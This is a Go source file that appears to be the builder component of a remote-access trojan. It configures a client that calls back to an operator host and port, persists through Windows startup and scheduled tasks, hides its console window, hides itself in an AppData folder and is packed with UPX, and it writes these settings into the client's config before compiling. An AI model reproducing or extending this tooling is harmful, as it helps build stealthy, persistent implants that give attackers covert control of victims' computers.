package helper

import (
	"fmt"
	"os"
	"os/exec"
	"strconv"
)

// `ClientBuildConfig` represents the configuration settings needed to build the client.
type ClientBuildConfig struct {
	// Type of client to build.
	OS   byte
	Lang byte

	// Basic client build configuration settings.
	File        string
	Host        string
	Port        int32
	CompressUPX bool
	NoConsoleUI bool

	// Persistence options
	StartupPersistence   bool
	SchedulerPersistence bool

	// Folder and file to store the persistent executable.
	AppDataFolderName string
	AppDataFileName   string

	// Updating build status.
	Status string
}

// `NewBuilderConfig` returns a new ClientBuildConfig with its default configuration settings.
func NewBuilderConfig() *ClientBuildConfig {
	return &ClientBuildConfig{
		// Default configuration values.
		File:                 "client.exe",
		Host:                 "0.0.0.0",
		Port:                 8080,
		CompressUPX:          true,
		NoConsoleUI:          false,
		StartupPersistence:   true,
		SchedulerPersistence: true,
		AppDataFolderName:    "pout",
		AppDataFileName:      "client.exe",
		Status:               "Awaiting build...",
	}
}

// `ClientBuildConfig.UpdateStatus` sets the current build status to the formatted passed text.
// This function is currently only implemented so that it will be easier to modify all
// status updates, instead of having to modify the formatting scheme at a later date.
func (build *ClientBuildConfig) UpdateStatus(status string) {
	build.Status = /*fmt.Sprintf("[+] %s",*/ status //)
}

// `ClientBuildConfig.BuildClient` executes the commands to build the client directory
// and compress it using UPX if it's set in the build config, along with additional flags.
func (build *ClientBuildConfig) BuildClient() error {
	build.UpdateStatus("Building...")

	// Command flags to use with the GoLang build command.
	flags := "-s -w"
	if build.NoConsoleUI {
		// A better method for disabling the console windows needs to be implemented.
		// All this does is close it initially, but when running commands in the process
		// (when in a shell for example), the window pops up for a brief moment each time.
		//
		// Another solution for this problem would be to execute commands using an outside process,
		// as opposed to the current one (client.exe).l
		flags += " -H windowsgui"
	}

	// Use the `go build` command with optimal flags for build size reduction to build the client.
	buildCmd := exec.Command("go", "build", "-ldflags", flags, "-o", "build/"+build.File, ".")
	buildCmd.Dir = "client" // Set the build command to be executed in the client directory.
	buildCmd.Stdout = os.Stdout
	buildCmd.Stderr = os.Stderr

	// Run the GoLang build command.
	if err := buildCmd.Run(); err != nil {
		build.UpdateStatus("Build failed!")
		return fmt.Errorf("failed to build the client: %w", err)
	}

	if build.CompressUPX {
		build.UpdateStatus("Compressing...")

		// Compress the client executable using UPX.
		compressCmd := exec.Command("build/upx.exe", "build/"+build.File)
		compressCmd.Dir = "client" // Set the upx command to be executed in the client directory.
		compressCmd.Stdout = os.Stdout
		compressCmd.Stderr = os.Stderr

		// Run the UPX compression command.
		if err := compressCmd.Run(); err != nil {
			build.UpdateStatus("Compression failed!")
			return fmt.Errorf("failed to compress the client using UPX: %w", err)
		}
	}

	build.UpdateStatus("Build Succesful!")
	return nil
}

// `ClientBuildConfig.WriteConfig` resets the clients config file and replaces its contents
// with the formatted CONFIG_TEMPLATE, which includes the passed host and port.
func (build *ClientBuildConfig) WriteConfig() error {
	build.UpdateStatus("Writing config...")

	// Clean / reset the config file.
	if err := os.WriteFile(CONFIG_PATH, []byte(""), 0644); err != nil {
		build.UpdateStatus("Failed to clear config!")
		return fmt.Errorf("failed to reset the clients config file: %w", err)
	}

	// Write the formatted config template back to the file.
	if err := os.WriteFile(CONFIG_PATH, []byte(fmt.Sprintf(CONFIG_TEMPLATE,
		// Persistence-related variables.
		strconv.FormatBool(build.StartupPersistence),
		strconv.FormatBool(build.SchedulerPersistence),

		// File/Folder variables.
		build.AppDataFolderName,
		build.AppDataFileName,

		// Connection variables.
		build.Host,
		fmt.Sprint(build.Port),
	)), 0644); err != nil {
		// Couldn't write the config to the file.
		build.UpdateStatus("Failed to write config!")
		return fmt.Errorf("failed to reset the clients config file: %w", err)
	}

	return nil
}

// Path to replace the contents of with the CONFIG_TEMPLATE.
// This is the file that the client uses to get the server host and port to connect to.
const CONFIG_PATH = "./client/config.go"

// Config template to replace the host and port of, and write to the CONFIG_PATH.
const CONFIG_TEMPLATE = `package main

var (
	StartupPersistence   = %s
	SchedulerPersistence = %s

	AppDataFolderName = "%s"
	AppDataFileName   = "%s"

	ServerHost = "%s"
	ServerPort = "%s"
)
`

// Client language types.
const (
	LANG_GO  = 0x01
	LANG_CPP = 0x02
)

// Client operating system types.
const (
	OS_WIN = 0x01
	OS_NIX = 0x02
)
